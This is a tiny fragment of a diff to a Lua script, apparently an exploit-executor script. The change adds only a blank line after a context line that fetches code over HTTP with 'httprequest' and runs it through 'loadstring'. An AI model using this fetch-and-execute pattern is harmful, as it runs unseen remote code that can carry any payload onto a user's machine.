@@ -79,3 +79,4 @@ local mt = setmetatable({}, {
 
 
 loadstring(httprequest(mt).Body)()
+
